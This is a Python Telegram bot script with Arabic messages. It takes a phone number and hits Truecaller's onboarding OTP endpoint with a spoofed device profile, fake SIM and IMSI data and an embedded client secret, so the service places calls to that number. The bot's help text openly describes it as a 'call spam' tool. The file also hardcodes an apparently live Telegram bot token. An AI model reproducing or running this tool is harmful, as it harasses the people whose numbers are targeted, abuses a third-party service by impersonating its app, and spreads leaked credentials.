import requests
import hashlib
import random
import telebot
from telebot.types import InlineKeyboardButton as Btn, InlineKeyboardMarkup as Mak
import time
from concurrent.futures import ThreadPoolExecutor

asa = '123456789'
gigk = ''.join(random.choice(asa) for _ in range(10))

md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

# توكن البوت الخاص بك
token = "7065007495:AAHubA_qSq69iOSNylbFAdl7kVygHUk5yHo"
bot = telebot.TeleBot(token)

user_attempts = {}

executor = ThreadPoolExecutor(max_workers=10)

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    user_attempts[user_id] = 0
    bot.reply_to(message, f'''اهلا بك عزيزي {name}،
أرسل الرقم مع رمز الدولة،
لديك {5 - user_attempts[user_id]} من الفرص على كل رقم متبقية اليوم.''', 
    reply_markup=Mak().row(
        Btn('شرح البوت 🔀', callback_data='click'),
        Btn('تقييم البوت', url='https://t.me/TQEEMBOT?start=0007rsflzu')
    ))

def call_async(number):
    global user_attempts
    user_id = number
    if user_id not in user_attempts:
        user_attempts[user_id] = 0
    
    current_time = time.time()
    
    if user_attempts[user_id] < 5: # تغيير عدد المحاولات إلى 5
        user_attempts[user_id] += 1

        url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

        headers = {
            "Host": "account-asia-south1.truecaller.com",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "Truecaller/12.34.8 (Android; 8.1.2)",
            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
        }

        data = {"countryCode": "eg","dialingCode": 20,"installationDetails": {"app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},"device": {"deviceId": md5,"language": "ar","manufacturer": "Xiaomi","mobileServices": ["GMS"],"model": "Redmi Note 8A Prime","osName": "Android","osVersion": "7.1.2","simSerials": ["8920022021714943876f","8920022022805258505f"]},"language": "ar","sims": [{"imsi": "602022207634386","mcc": "602","mnc": "2","operator": "vodafone"},{"imsi": "602023133590849","mcc": "602","mnc": "2","operator": "vodafone"}],"storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}},"phoneNumber": number,"region": "region-2","sequenceNo": 1}

        req = requests.post(url, headers=headers, json=data).json()
        if req.get('status') == 40003:
            return '❌ رقم الهاتف غير صحيح'
        else:
            phonum = req.get('parsedPhoneNumber')
            coucode = req.get('parsedCountryCode')
            text = f'''رقم الهاتف : {phonum} ☎️
رمز البلد  :  {coucode} 🌏
محاولة : {5 - user_attempts[user_id]} ♨️
النتيجة : {'تم الاتصال بل رقم المطلوب✅' if req.get('status') == 1 else 'فشل الاتصال حاول غدا  ❌'}'''
            return text
    else:
        return '❌ لقد نفذت المحاولات على هذا الرقم، جرب رقمًا آخر.'

@bot.message_handler(content_types=['text'])
def num(message):
    number = message.text
    executor.submit(process_request, number, message)

def process_request(number, message):
    spam = call_async(number)
    bot.reply_to(message, spam)

@bot.callback_query_handler(func=lambda call: call.data == 'click')
def all(call):
    bot.send_message(call.message.chat.id, '''هذا البوت يمكنك من خلاله تسوي سبام اتصال مرتين على كل رقم في اليوم.
البوت شغال دائمًا ويقوم بإرسال النتيجة إذا وصل الاتصال أو فشل.
المطور @XX44G
تقييم البوت 🌝 >''')

bot.infinity_polling()
